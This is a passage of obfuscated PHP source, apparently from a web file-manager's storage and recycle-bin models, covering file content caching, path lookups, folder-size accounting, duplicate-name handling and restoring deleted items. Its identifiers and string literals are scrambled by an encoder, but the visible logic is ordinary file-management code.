$š¿ï¿ã[$ã‚ıõğ[549]] = str_replace($ã‚ıõğ[53], $ã‚ıõğ[12], Pinyin::get($ÙóäÇÎ)); $š¿ï¿ã[$ã‚ıõğ[548]] = Pinyin::get($ÙóäÇÎ, $ã‚ıõğ[672]); } if (!$úˆ€´ìğ && !$Çî’¦û‹) { $š¿ï¿ã[$ã‚ıõğ[549]] = null; $š¿ï¿ã[$ã‚ıõğ[548]] = null; } $this->metaSet($Î­€Ã©Õ, $š¿ï¿ã); } public function getContent($òõÍ˜) { $ÒÍÈË¼ê =& $_SERVER[åÄ¼Ùßš]; $æ¶‘ºÇƒ = $this->fileInfoGet($òõÍ˜); if (!$æ¶‘ºÇƒ) { return !1; } if ($æ¶‘ºÇƒ[$ÒÍÈË¼ê[79]] == 0) { return $ÒÍÈË¼ê[12]; } $Ö¥İéëæ = $ÒÍÈË¼ê[2344] . $æ¶‘ºÇƒ[$ÒÍÈË¼ê[560]]; if ($æ¶‘ºÇƒ[$ÒÍÈË¼ê[79]] <= 1024 * 10) { $™¬‹å«» = Cache::get($Ö¥İéëæ); if (!$™¬‹å«») { $™¬‹å«» = IO::getContent($æ¶‘ºÇƒ[$ÒÍÈË¼ê[87]]); Cache::set($Ö¥İéëæ, $™¬‹å«»); } return $™¬‹å«»; } if (!$æ¶‘ºÇƒ[$ÒÍÈË¼ê[87]]) { return $ÒÍÈË¼ê[12]; } return IO::getContent($æ¶‘ºÇƒ[$ÒÍÈË¼ê[87]]); } public function setDesc($Àö×Ù‘Ş, $…¤°Ïª) { $º²í–§Š =& $_SERVER[åÄ¼Ùßš]; Model($º²í–§Š[649])->eventAddDesc($Àö×Ù‘Ş, $…¤°Ïª); return $this->metaSet($Àö×Ù‘Ş, $º²í–§Š[537], $…¤°Ïª); } public function setContent($«²·ü¾, $Ú¯Äé˜ = '') { $ÎŠ™ƒŸ =& $_SERVER[åÄ¼Ùßš]; $ì‡©±º¾ = $this->sourceInfo($«²·ü¾); $··ŠÑˆÂ = $this->fileInfoGet($«²·ü¾); if (!$··ŠÑˆÂ || !$ì‡©±º¾) { return !1; } $öûò§Ó™ = KodIO::ioFileDriverGet($ÎŠ™ƒŸ[495] . $«²·ü¾ . $ÎŠ™ƒŸ[404]); $ÍáÆ½Ëú = Model($ÎŠ™ƒŸ[557])->addFileByContent($Ú¯Äé˜, $öûò§Ó™, $ì‡©±º¾[$ÎŠ™ƒŸ[32]]); if (!$ÍáÆ½Ëú) { return !1; } $“ µ€¯ = $this->fileHistory($ì‡©±º¾, $ÍáÆ½Ëú[$ÎŠ™ƒŸ[554]], $ÍáÆ½Ëú[$ÎŠ™ƒŸ[79]]); if (!$“ µ€¯) { return Model($ÎŠ™ƒŸ[557])->remove($ÍáÆ½Ëú[$ÎŠ™ƒŸ[554]]); } $this->folderSizeReset($ì‡©±º¾[$ÎŠ™ƒŸ[193]]); return !0; } public function fileSubstr($ÄÎåˆï, $Ë°“Áô, $´å¤‰„) { $Õ—ß¯ƒ = $this->fileInfoGet($ÄÎåˆï); if (!$Õ—ß¯ƒ) { return !1; } return IO::fileSubstr($Õ—ß¯ƒ[$_SERVER[åÄ¼Ùßš][87]], $Ë°“Áô, $´å¤‰„); } public function fileInfoGet($ËóãĞ—Æ) { $Š§¿òÉ— =& $_SERVER[åÄ¼Ùßš]; $õô§À•ã = $this->sourceInfo($ËóãĞ—Æ); if (!$õô§À•ã || $õô§À•ã[$Š§¿òÉ—[497]]) { return !1; } $ùŞ„¯äñ = $Š§¿òÉ—[561] . $õô§À•ã[$Š§¿òÉ—[554]]; $Á€€ÓĞ‹ = _get(self::$cacheFileInfo, $ùŞ„¯äñ); if ($Á€€ÓĞ‹) { return $Á€€ÓĞ‹; } $¡±ò…ã = Model($Š§¿òÉ—[557])->fileInfo($õô§À•ã[$Š§¿òÉ—[554]]); if ($¡±ò…ã) { $¡±ò…ã[$Š§¿òÉ—[32]] = $õô§À•ã[$Š§¿òÉ—[32]]; } self::$cacheFileInfo[$ùŞ„¯äñ] = $¡±ò…ã; return $¡±ò…ã; } private function folderChildrenNumber($¦ˆÕî‡) { $ÍàüÙÖ =& $_SERVER[åÄ¼Ùßš]; $¬³ÂÓÕé = $this->sourceInfo($¦ˆÕî‡); $‘Ö¥şæ² = array($ÍàüÙÖ[668] => array($ÍàüÙÖ[628], $¬³ÂÓÕé[$ÍàüÙÖ[597]] . $¦ˆÕî‡ . $ÍàüÙÖ[629]), $ÍàüÙÖ[665] => $¬³ÂÓÕé[$ÍàüÙÖ[582]], $ÍàüÙÖ[516] => intval($¬³ÂÓÕé[$ÍàüÙÖ[517]]), $ÍàüÙÖ[662] => 1); $Ö‰·™Ë† = $this->where($‘Ö¥şæ²)->count(); $ÆÓüÀ‘¡ = $this->where($‘Ö¥şæ²)->where(array($ÍàüÙÖ[662] => 0))->count(); return array($ÍàüÙÖ[83] => $ÆÓüÀ‘¡, $ÍàüÙÖ[84] => $Ö‰·™Ë†); } public function pathInfo($€®èê“, $ş­îŞ´‡ = false) { $šŠÊ¢ç• =& $_SERVER[åÄ¼Ùßš]; $ş­îŞ´‡ = !1; $€®èê“ = intval($€®èê“); $·óáÅŸ· = $šŠÊ¢ç•[545] . intval($ş­îŞ´‡) . $šŠÊ¢ç•[474] . $€®èê“; $åèíÉ§Ş = _get(self::$cachePathInfo, $·óáÅŸ·); if ($åèíÉ§Ş) { return $åèíÉ§Ş; } $ÉøÁå›Ê = $this->sourceInfo($€®èê“); if (!$ÉøÁå›Ê) { return !1; } $ÉøÁå›Ê = $this->_listDataApplyItem($ÉøÁå›Ê, $ş­îŞ´‡); self::$cachePathInfo[$·óáÅŸ·] = $ÉøÁå›Ê; return $ÉøÁå›Ê; } public static $cachePathInfoMore = array(); public function pathInfoMore($Ò¿ºƒ¬˜) { $»É»§²× =& $_SERVER[åÄ¼Ùßš]; $Ş„Ï·¶± = _get(self::$cachePathInfoMore, $Ò¿ºƒ¬˜); if ($Ş„Ï·¶±) { return $Ş„Ï·¶±; } $™Ù´ëÍë = $this->pathInfo($Ò¿ºƒ¬˜); if (!$™Ù´ëÍë) { return !1; } if ($™Ù´ëÍë[$»É»§²×[497]] == $»É»§²×[91]) { $™Ù´ëÍë[$»É»§²×[82]] = $this->folderChildrenNumber($Ò¿ºƒ¬˜); } self::$cachePathInfoMore[$Ò¿ºƒ¬˜] = $™Ù´ëÍë; return $™Ù´ëÍë; } public function sourceInfo($õ«öÙĞ£) { $á‚çï³© =& $_SERVER[åÄ¼Ùßš]; if (!$õ«öÙĞ£) { return array(); } $õ«öÙĞ£ = intval($õ«öÙĞ£); $Ïª°Ò = $á‚çï³©[544] . $õ«öÙĞ£; $Ü¹¡·²¿ = _get(self::$cacheSourceInfo, $Ïª°Ò); if ($Ü¹¡·²¿) { return $Ü¹¡·²¿; } $ì“ÅÀö² = $this->where(array($á‚çï³©[194] => $õ«öÙĞ£))->find(); self::$cacheSourceInfo[$Ïª°Ò] = $ì“ÅÀö²; return self::$cacheSourceInfo[$Ïª°Ò]; } public function sourceCacheClear($­Û¤îŠ = false) { self::cacheClear($­Û¤îŠ); } public static function cacheClear($ø¼”Öº‘ = false) { $É½ÎÇğ =& $_SERVER[åÄ¼Ùßš]; if ($ø¼”Öº‘ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$É½ÎÇğ[544] . $ø¼”Öº‘]); unset(self::$cachePathInfoMore[$ø¼”Öº‘]); unset(self::$cachePathInfo[$É½ÎÇğ[2345] . $ø¼”Öº‘]); unset(self::$cachePathInfo[$É½ÎÇğ[2346] . $ø¼”Öº‘]); } public function metaSet($áãÍ…ğ, $ŸÃ›Ğ„ = null, $Ã°€¬Æ› = null) { $‘ÚÄ²´² = parent::metaSet($áãÍ…ğ, $ŸÃ›Ğ„, $Ã°€¬Æ›); if ($‘ÚÄ²´²) { $this->sourceCacheClear($áãÍ…ğ); } return $‘ÚÄ²´²; } public function pathInfoByPath($€ÎêˆÁ±, $ø÷ĞÕÃ‘) { $šÀú’½ =& $_SERVER[åÄ¼Ùßš]; $­Æµ€ø¯ = !$ø÷ĞÕÃ‘ ? array() : explode($šÀú’½[8], trim($ø÷ĞÕÃ‘, $šÀú’½[8])); $ƒª´Û·® = intval($€ÎêˆÁ±); foreach ($­Æµ€ø¯ as $ûºìœÔ›) { $¸Óéı±Î = array($šÀú’½[193] => $ƒª´Û·®, $šÀú’½[32] => $ûºìœÔ›); $éßôîı = $this->field($šÀú’½[2347])->where($¸Óéı±Î)->select(); if (!$éßôîı) { return !1; } $éßôîı = array_sort_by($éßôîı, $šÀú’½[517]); $ƒª´Û·® = intval($éßôîı[0][$šÀú’½[194]]); } $§åé¯— = $this->sourceInfo($ƒª´Û·®); $this->pathInfoFilter($§åé¯—); return $§åé¯—; } protected function updateModifyTime($şä²§°ï) { $÷àÎ‘Ô‡ =& $_SERVER[åÄ¼Ùßš]; $–øÍ¶ÒÜ = KodUser::id(); if (!$şä²§°ï) { return; } if (!is_array($şä²§°ï)) { $şä²§°ï = array($şä²§°ï); } foreach ($şä²§°ï as $µºéŸû => $†Ô§¤¯ª) { $şä²§°ï[$µºéŸû] = intval($†Ô§¤¯ª); $this->sourceCacheClear($†Ô§¤¯ª); } $ä¬ŸÅéÍ = array($÷àÎ‘Ô‡[194] => array($÷àÎ‘Ô‡[7], $şä²§°ï)); $¹«ª¹­ = array($÷àÎ‘Ô‡[667] => $–øÍ¶ÒÜ, $÷àÎ‘Ô‡[510] => time()); $this->where($ä¬ŸÅéÍ)->save($¹«ª¹­); } public function folderSizeReset($Ôòçø©Ó, $½¯ÌÓŞü = false) { $†Òºšˆ§ =& $_SERVER[åÄ¼Ùßš]; if ($this->statusIgnoreResetSpace) { return; } if (!$Ôòçø©Ó) { return; } $Ç…ßĞ¹ = $this->sourceInfo($Ôòçø©Ó); $ß©ı™¶× = $†Òºšˆ§[2348] . $Ôòçø©Ó; if (!$Ç…ßĞ¹ || !$Ç…ßĞ¹[$†Òºšˆ§[194]]) { return; } CacheLock::lock($ß©ı™¶×, 20); if ($½¯ÌÓŞü === !1) { $this->sourceCacheClear($Ôòçø©Ó); $Ç…ßĞ¹ = $this->sourceInfo($Ôòçø©Ó); $Äê””£ş = array($†Òºšˆ§[489] => $Ôòçø©Ó, $†Òºšˆ§[516] => 0); $œÊ›»›Ş = $this->where($Äê””£ş)->sum($†Òºšˆ§[79]); $½¯ÌÓŞü = intval($œÊ›»›Ş) - intval($Ç…ßĞ¹[$†Òºšˆ§[79]]); } if ($½¯ÌÓŞü == 0) { return CacheLock::unlock($ß©ı™¶×); } $Æüğşö± = $this->parentLevelArray($Ç…ßĞ¹[$†Òºšˆ§[597]]); if (!$Æüğşö±) { $Æüğşö± = array(); } $Æüğşö±[] = $Ç…ßĞ¹[$†Òºšˆ§[194]]; $Äê””£ş = array($†Òºšˆ§[194] => array($†Òºšˆ§[504], $Æüğşö±)); if ($½¯ÌÓŞü < 0) { $Äê””£ş[$†Òºšˆ§[79]] = array($†Òºšˆ§[1123], abs($½¯ÌÓŞü)); } $this->where($Äê””£ş)->setAdd($†Òºšˆ§[79], $½¯ÌÓŞü); CacheLock::unlock($ß©ı™¶×); if (!$Ç…ßĞ¹[$†Òºšˆ§[582]] || $Ç…ßĞ¹[$†Òºšˆ§[582]] == $†Òºšˆ§[231]) { return; } $¶³È×¡Ë = $†Òºšˆ§[2349] . $Ç…ßĞ¹[$†Òºšˆ§[191]] . $†Òºšˆ§[4] . $Ç…ßĞ¹[$†Òºšˆ§[582]]; $šú—Â”¦ = array($Ç…ßĞ¹[$†Òºšˆ§[191]], $Ç…ßĞ¹[$†Òºšˆ§[582]]); TaskRun::timeLimitCall($¶³È×¡Ë, $†Òºšˆ§[2350], $šú—Â”¦, 1.5); } public function folderSizeResetChildren($¯ŠÃ¨æË) { $äº„ø“ê =& $_SERVER[åÄ¼Ùßš]; $this->sourceCacheClear($¯ŠÃ¨æË); $£·ì±èû = $this->sourceInfo($¯ŠÃ¨æË); if (!$£·ì±èû) { return; } $ÒÊºæœ = array($äº„ø“ê[662] => 1, $äº„ø“ê[665] => $£·ì±èû[$äº„ø“ê[582]], $äº„ø“ê[668] => array($äº„ø“ê[628], $£·ì±èû[$äº„ø“ê[597]] . $¯ŠÃ¨æË . $äº„ø“ê[629])); $Ò±ç–È¨ = $äº„ø“ê[2351]; $¤ÉŞ¬Æƒ = $this->field($Ò±ç–È¨)->where($ÒÊºæœ)->select(); $ÒÊºæœ[$äº„ø“ê[497]] = 0; $»ëê‚Û¯ = $this->field($Ò±ç–È¨)->where($ÒÊºæœ)->select(); if (!$»ëê‚Û¯) { return; } $¤ÉŞ¬Æƒ[] = $£·ì±èû; $¤ÉŞ¬Æƒ = array_to_keyvalue($¤ÉŞ¬Æƒ, $äº„ø“ê[194]); foreach ($¤ÉŞ¬Æƒ as $Û²ğñÖˆ => $æ´åîü£) { $¤ÉŞ¬Æƒ[$Û²ğñÖˆ][$äº„ø“ê[2352]] = $¤ÉŞ¬Æƒ[$Û²ğñÖˆ][$äº„ø“ê[79]]; $¤ÉŞ¬Æƒ[$Û²ğñÖˆ][$äº„ø“ê[79]] = 0; } foreach ($»ëê‚Û¯ as $æ´åîü£) { $„ò”ÂË = $æ´åîü£[$äº„ø“ê[193]] . $äº„ø“ê[12]; if (!isset($¤ÉŞ¬Æƒ[$„ò”ÂË])) { continue; } if ($æ´åîü£[$äº„ø“ê[517]] == $¤ÉŞ¬Æƒ[$„ò”ÂË][$äº„ø“ê[517]]) { $¤ÉŞ¬Æƒ[$„ò”ÂË][$äº„ø“ê[79]] += $æ´åîü£[$äº„ø“ê[79]]; } } foreach ($¤ÉŞ¬Æƒ as $æ´åîü£) { $‰‹¬•‹ = $this->parentLevelArray($æ´åîü£[$äº„ø“ê[597]]); foreach ($‰‹¬•‹ as $„ò”ÂË) { $„ò”ÂË = $„ò”ÂË . $äº„ø“ê[12]; if (!isset($¤ÉŞ¬Æƒ[$„ò”ÂË])) { continue; } if ($æ´åîü£[$äº„ø“ê[517]] == $¤ÉŞ¬Æƒ[$„ò”ÂË][$äº„ø“ê[517]]) { $¤ÉŞ¬Æƒ[$„ò”ÂË][$äº„ø“ê[79]] += $æ´åîü£[$äº„ø“ê[79]]; } } } $Ãª»¯¤ = array(); foreach ($¤ÉŞ¬Æƒ as $æ´åîü£) { if ($æ´åîü£[$äº„ø“ê[79]] == $æ´åîü£[$äº„ø“ê[2352]]) { continue; } $Ãª»¯¤[] = array($äº„ø“ê[194], $æ´åîü£[$äº„ø“ê[194]], $äº„ø“ê[79], $æ´åîü£[$äº„ø“ê[79]]); } $this->saveAll($Ãª»¯¤); } public function userSpaceReset($Â„²äŸï = false) { $—¿Ã†¸ñ =& $_SERVER[åÄ¼Ùßš]; $´Æ·ä½» = $this->where(array($—¿Ã†¸ñ[191] => self::TYPE_USER, $—¿Ã†¸ñ[582] => $Â„²äŸï, $—¿Ã†¸ñ[497] => 0))->sum($—¿Ã†¸ñ[79]); $´Æ·ä½» = !$´Æ·ä½» || $´Æ·ä½» <= 0 ? 0 : $´Æ·ä½»; Model($—¿Ã†¸ñ[590])->userEdit($Â„²äŸï, array($—¿Ã†¸ñ[2006] => $´Æ·ä½»)); } public function targetSpaceUpdate($›ƒëĞ±Ò, $ƒØÑê£ï) { $ººÄ×ºı =& $_SERVER[åÄ¼Ùßš]; if (!$ƒØÑê£ï) { return; } if (!in_array($›ƒëĞ±Ò, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $®ü¤ÂĞˆ = $this->targetSpaceSize($›ƒëĞ±Ò, $ƒØÑê£ï); if ($›ƒëĞ±Ò == self::TYPE_USER) { Model($ººÄ×ºı[590])->userEdit($ƒØÑê£ï, array($ººÄ×ºı[2006] => $®ü¤ÂĞˆ)); } else { if ($›ƒëĞ±Ò == self::TYPE_GROUP) { Model($ººÄ×ºı[598])->groupEdit($ƒØÑê£ï, array($ººÄ×ºı[2006] => $®ü¤ÂĞˆ)); } } } public function targetSpaceSize($¼ÖóŠÙÄ, $·óÒ˜éå) { $“€Áäéä =& $_SERVER[åÄ¼Ùßš]; $Ëç›Ñ÷­ = 0; $¢äËˆÕ = $this->targetSourceRoot($¼ÖóŠÙÄ, $·óÒ˜éå, !0); foreach ($¢äËˆÕ as $øÓğ€Õš) { if (!$øÓğ€Õš) { continue; } $Ëç›Ñ÷­ += floatval($øÓğ€Õš[$“€Áäéä[79]]); $È€ìóè§ = array($“€Áäéä[668] => array($“€Áäéä[628], $“€Áäéä[606] . $øÓğ€Õš[$“€Áäéä[194]] . $“€Áäéä[629])); $‡Ì¦Äİå = Model($“€Áäéä[515])->field($“€Áäéä[503])->where($È€ìóè§)->select(); $‡Ì¦Äİå = array_to_keyvalue($‡Ì¦Äİå, $“€Áäéä[12], $“€Áäéä[194]); $‡Ì¦Äİå = array_unique(array_filter($‡Ì¦Äİå)); if ($‡Ì¦Äİå) { $È€ìóè§ = array($“€Áäéä[503] => array($“€Áäéä[504], $‡Ì¦Äİå)); $Ëç›Ñ÷­ += floatval($this->where($È€ìóè§)->sum($“€Áäéä[79])); } } $Ëç›Ñ÷­ = !$Ëç›Ñ÷­ || $Ëç›Ñ÷­ <= 0 ? 0 : $Ëç›Ñ÷­; return $Ëç›Ñ÷­; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($É¶šÌæĞ) { return $this->fileTypeProfile($É¶šÌæĞ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($ÄŒ¡şØ) { return $this->fileTypeProfile($ÄŒ¡şØ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($¦˜Ç¶, $³ª×ÂÕª) { $£—ÑÇüù =& $_SERVER[åÄ¼Ùßš]; $¤Êá‚úÓ = $£—ÑÇüù[2353] . $¦˜Ç¶ . $£—ÑÇüù[11] . $³ª×ÂÕª; $§çæÛœ = Cache::get($¤Êá‚úÓ); if ($§çæÛœ) { return $§çæÛœ; } $ĞóŞ©òµ = array($£—ÑÇüù[662] => 0); if ($¦˜Ç¶ != !1) { $ĞóŞ©òµ[$£—ÑÇüù[582]] = $¦˜Ç¶; $ĞóŞ©òµ[$£—ÑÇüù[191]] = $³ª×ÂÕª; } $ÚùÓÃ„É = array(); $ÚùÓÃ„É[$£—ÑÇüù[2354]] = array($£—ÑÇüù[2355] => LNG($£—ÑÇüù[2354]), $£—ÑÇüù[2356] => $this->where($ĞóŞ©òµ)->count(), $£—ÑÇüù[633] => $this->where($ĞóŞ©òµ)->sum($£—ÑÇüù[79])); $ƒ¡”¥‘ = KodIO::fileTypeList(); foreach ($ƒ¡”¥‘ as $ğ„¡Ùö => $©úö±é€) { $ĞóŞ©òµ[$£—ÑÇüù[498]] = $this->fileTypeWhere($ğ„¡Ùö); $ÚùÓÃ„É[$ğ„¡Ùö] = array($£—ÑÇüù[2355] => $©úö±é€[$£—ÑÇüù[32]], $£—ÑÇüù[2356] => $this->where($ĞóŞ©òµ)->count(), $£—ÑÇüù[633] => $this->where($ĞóŞ©òµ)->sum($£—ÑÇüù[79])); } Cache::set($¤Êá‚úÓ, $ÚùÓÃ„É, 1200); return $ÚùÓÃ„É; } public function fileNameExist($ØÖİıÄ, $ÜşÇîşš) { $›‹„…Ÿİ =& $_SERVER[åÄ¼Ùßš]; $òŸš³š× = $this->field($›‹„…Ÿİ[2357])->where(array($›‹„…Ÿİ[193] => $ØÖİıÄ, $›‹„…Ÿİ[32] => $ÜşÇîşš, $›‹„…Ÿİ[517] => 0))->find(); return is_array($òŸš³š×) ? $òŸš³š×[$›‹„…Ÿİ[194]] : !1; } public function childList($ø…®Ë¤) { $šÆæåÍË =& $_SERVER[åÄ¼Ùßš]; $©ôÆÙ…‰ = $šÆæåÍË[2329] . $ø…®Ë¤; if (isset(self::$cacheChildList[$©ôÆÙ…‰])) { return self::$cacheChildList[$©ôÆÙ…‰]; } $†ïñİ = array($šÆæåÍË[193] => intval($ø…®Ë¤), $šÆæåÍË[517] => 0); $ôô°©Ã = $this->where($†ïñİ)->select(); $ôô°©Ã = $ôô°©Ã ? $ôô°©Ã : array(); self::$cacheChildList[$©ôÆÙ…‰] = $ôô°©Ã; foreach ($ôô°©Ã as $ÆœÂ¨šÒ) { $©ôÆÙ…‰ = $šÆæåÍË[544] . $ÆœÂ¨šÒ[$šÆæåÍË[194]]; self::$cacheSourceInfo[$©ôÆÙ…‰] = $ÆœÂ¨šÒ; } return $ôô°©Ã; } public function fileNameAuto($µÜÈ€®À, $•ïÓ’ê·, $Ø ä‡š÷ = REPEAT_RENAME, $ÓÉ¶‚èò = false) { $ıÉÜõ×ª =& $_SERVER[åÄ¼Ùßš]; $å­é˜ˆ§ = get_path_ext($•ïÓ’ê·); $¶‚´üĞµ = $å­é˜ˆ§ ? get_path_ext_name($•ïÓ’ê·) . $ıÉÜõ×ª[2358] . $å­é˜ˆ§ : $•ïÓ’ê· . $ıÉÜõ×ª[472]; $‘õ¦—£° = array($ıÉÜõ×ª[193] => $µÜÈ€®À, $ıÉÜõ×ª[517] => 0, $ıÉÜõ×ª[32] => array($ıÉÜõ×ª[471], $¶‚´üĞµ)); $À§ñûšÓ = $this->field($ıÉÜõ×ª[32])->where($‘õ¦—£°)->select(); $–ŞéÅ˜÷ = array_to_keyvalue($À§ñûšÓ, $ıÉÜõ×ª[12], $ıÉÜõ×ª[32]); return $this->fileNameAutoGet($–ŞéÅ˜÷, $•ïÓ’ê·, $Ø ä‡š÷, $ÓÉ¶‚èò); } public function fileNameAutoGet($†©üŠ­İ, $ÀÜƒÑ, $øó¦úÇĞ, $¶ÍıŒÌÛ) { $²Ş¹û¶ =& $_SERVER[åÄ¼Ùßš]; if ($øó¦úÇĞ == REPEAT_REPLACE || !$†©üŠ­İ || !in_array_not_case($ÀÜƒÑ, $†©üŠ­İ) || $¶ÍıŒÌÛ && $øó¦úÇĞ != REPEAT_RENAME_FOLDER) { return $ÀÜƒÑ; } if ($øó¦úÇĞ == REPEAT_SKIP) { return !1; } $Õ³ÄÁ¾¾ = $²Ş¹û¶[10] . get_path_ext($ÀÜƒÑ); $Õ³ÄÁ¾¾ = $Õ³ÄÁ¾¾ == $²Ş¹û¶[10] || $¶ÍıŒÌÛ ? $²Ş¹û¶[12] : $Õ³ÄÁ¾¾; for ($áƒğ·¦  = 1; $áƒğ·¦  <= count($†©üŠ­İ) + 1; $áƒğ·¦ ++) { $Ñı±ó“§ = substr($ÀÜƒÑ, 0, strlen($ÀÜƒÑ) - strlen($Õ³ÄÁ¾¾)); $ñ¨ÊüÎÌ = $Ñı±ó“§ . "\50{$áƒğ·¦ }\51{$Õ³ÄÁ¾¾}"; if (!in_array_not_case($ñ¨ÊüÎÌ, $†©üŠ­İ)) { return $ñ¨ÊüÎÌ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\x6f\165\x72\143\x65\x5f\162\145\x63\x79\x63\154\x65"; protected $dataAuto = array(array("\143\162\x65\x61\164\145\124\x69\x6d\145", "\x74\151\x6d\145", "\x69\x6e\163\145\x72\164", "\x66\165\156\x63\164\151\x6f\x6e")); public function listData($ôÚ«ğ½á = false) { $£†™ÑÅö =& $_SERVER[åÄ¼Ùßš]; $ôÚ«ğ½á = $ôÚ«ğ½á ? $ôÚ«ğ½á : USER_ID; $íÆ“Èè¸ = $this->where(array($£†™ÑÅö[1808] => $ôÚ«ğ½á))->select(); return array_to_keyvalue($íÆ“Èè¸, $£†™ÑÅö[12], $£†™ÑÅö[194]); } public function moveToRecycle($ôÃğìÉ) { $¨İœìİœ =& $_SERVER[åÄ¼Ùßš]; $ÛÛá‰ = Model($¨İœìİœ[1466]); $ØôœäÑÚ = $ÛÛá‰->sourceInfo($ôÃğìÉ); if (!$ØôœäÑÚ || $ØôœäÑÚ[$¨İœìİœ[517]] == $¨İœìİœ[91]) { return; } $œô¬¦„ê = array($¨İœìİœ[503] => $ôÃğìÉ, $¨İœìİœ[1808] => USER_ID, $¨İœìİœ[664] => $ØôœäÑÚ[$¨İœìİœ[191]], $¨İœìİœ[665] => $ØôœäÑÚ[$¨İœìİœ[582]], $¨İœìİœ[668] => $ØôœäÑÚ[$¨İœìİœ[597]]); $this->add($œô¬¦„ê); $this->recycleMove($ôÃğìÉ, 1); if ($ØôœäÑÚ[$¨İœìİœ[497]] == $¨İœìİœ[91]) { $ä£Ú§”§ = array($¨İœìİœ[668] => array($¨İœìİœ[628], $ØôœäÑÚ[$¨İœìİœ[597]] . $ôÃğìÉ . $¨İœìİœ[629])); $ÛÛá‰->where($ä£Ú§”§)->setField($¨İœìİœ[517], 1); } } public function clear() { $this->remove(!1); } public function remove($×¸õ¿¬³ = false, $£¾µæô¬ = false) { $Ü¡¤Ÿ•Û =& $_SERVER[åÄ¼Ùßš]; $£¾µæô¬ = $£¾µæô¬ ? $£¾µæô¬ : USER_ID; $õ¡ıä = Model($Ü¡¤Ÿ•Û[1466]); $ÅìÀûÏ = $this->listData($£¾µæô¬); $×¸õ¿¬³ = $×¸õ¿¬³ === !1 ? !1 : $×¸õ¿¬³; $®ó½êâÓ = array(); foreach ($ÅìÀûÏ as $Ö…ş¢Şş) { if ($×¸õ¿¬³ != !1 && !in_array($Ö…ş¢Şş, $×¸õ¿¬³)) { continue; } $‹–ƒƒÛŒ = $õ¡ıä->sourceInfo($Ö…ş¢Şş); $õ¡ıä->remove($Ö…ş¢Şş, !1); $à¢…š‡¡ = $‹–ƒƒÛŒ[$Ü¡¤Ÿ•Û[191]] . $Ü¡¤Ÿ•Û[11] . $‹–ƒƒÛŒ[$Ü¡¤Ÿ•Û[582]]; $®ó½êâÓ[$à¢…š‡¡] = array($Ü¡¤Ÿ•Û[664] => $‹–ƒƒÛŒ[$Ü¡¤Ÿ•Û[191]], $Ü¡¤Ÿ•Û[582] => $‹–ƒƒÛŒ[$Ü¡¤Ÿ•Û[582]]); $this->where(array($Ü¡¤Ÿ•Û[194] => $Ö…ş¢Şş))->delete(); } foreach ($®ó½êâÓ as $œ¦€Å•¿) { $õ¡ıä->targetSpaceUpdate($œ¦€Å•¿[$Ü¡¤Ÿ•Û[191]], $œ¦€Å•¿[$Ü¡¤Ÿ•Û[582]]); } } public function restore($³­î¹„„ = false) { $ª¹ôî’ = $this->listData(); $this->_restoreSource($ª¹ôî’, $³­î¹„„); } public function removeUserAll($ú¾‚§¡) { $this->remove(!1, $ú¾‚§¡); } public function restoreItem($¸Ìî‰­É) { $this->_restoreSource(array($¸Ìî‰­É), array($¸Ìî‰­É)); } private function _restoreSource($ì®¡î² , $–ı±æß×) { $ëËáêˆØ =& $_SERVER[åÄ¼Ùßš]; $¬ÉëîÏ¿ = Model($ëËáêˆØ[1466]); $–ı±æß× = $–ı±æß× == !1 ? !1 : $–ı±æß×; if (!$ì®¡î² ) { return !0; } $¬ß­€¡ = array(); foreach ($ì®¡î²  as $‹­Ç”ª°) { if ($–ı±æß× != !1 && !in_array($‹­Ç”ª°, $–ı±æß×)) { continue; } $Õ—÷Âò = $¬ÉëîÏ¿->sourceInfo($‹­Ç”ª°); $¥Óí–Áå = $¬ÉëîÏ¿->sourceInfo($Õ—÷Âò[$ëËáêˆØ[193]]); if ($¥Óí–Áå[$ëËáêˆØ[517]] == $ëËáêˆØ[91]) { continue; } $¬ÉëîÏ¿->lockMoveStart($‹­Ç”ª°); $this->recycleMove($‹­Ç”ª°, 0); if ($Õ—÷Âò[$ëËáêˆØ[497]] == $ëËáêˆØ[91]) { $Ìñòè ö = array($ëËáêˆØ[668] => array($ëËáêˆØ[628], $Õ—÷Âò[$ëËáêˆØ[597]] . $‹­Ç”ª° . $ëËáêˆØ[629])); $¬ÉëîÏ¿->where($Ìñòè ö)->setField($ëËáêˆØ[517], 0); $this->restoreFolderChildren($‹­Ç”ª°, $ì®¡î² ); } $this->where(array($ëËáêˆØ[194] => $‹­Ç”ª°))->delete(); $¬ÉëîÏ¿->folderSizeReset($Õ—÷Âò[$ëËáêˆØ[193]]); $¬ß­€¡[] = $Õ—÷Âò[$ëËáêˆØ[193]]; if ($Õ—÷Âò[$ëËáêˆØ[497]] == $ëËáêˆØ[91]) { $¬ß­€¡[] = $‹­Ç”ª°; } $¬ÉëîÏ¿->lockMoveEnd($‹­Ç”ª°); } $¬ÉëîÏ¿->updateModifyTime($¬ß­€¡); } private function restoreFolderChildren($©²Ï§İˆ, $ª­àòá¬) { $×ÅûçĞ… =& $_SERVER[åÄ¼Ùßš]; $ïİ°×İ = Model($×ÅûçĞ…[1466]); $Š÷Åàğ = array($×ÅûçĞ…[194] => array($×ÅûçĞ…[7], array())); foreach ($ª­àòá¬ as $®€Û¤å¯) { if ($®€Û¤å¯ == $©²Ï§İˆ) { continue; } if (!$ïİ°×İ->isParentOf($©²Ï§İˆ, $®€Û¤å¯)) { continue; } $á¾»£Ó = $ïİ°×İ->sourceInfo($®€Û¤å¯); if ($á¾»£Ó[$×ÅûçĞ…[497]] == $×ÅûçĞ…[91]) { $Š÷Åàğ[] = array($×ÅûçĞ…[668] => array($×ÅûçĞ…[628], $á¾»£Ó[$×ÅûçĞ…[597]] . $®€Û¤å¯ . $×ÅûçĞ…[629])); } else { $Š÷Åàğ[$×ÅûçĞ…[194]][1][] = $®€Û¤å¯; } } if (!$Š÷Åàğ[$×ÅûçĞ…[194]][1]) { unset($Š÷Åàğ[$×ÅûçĞ…[194]]); } if (!$Š÷Åàğ) { return; } if (is_array($Š÷Åàğ[$×ÅûçĞ…[194]]) && is_array($Š÷Åàğ[$×ÅûçĞ…[194]][1])) { 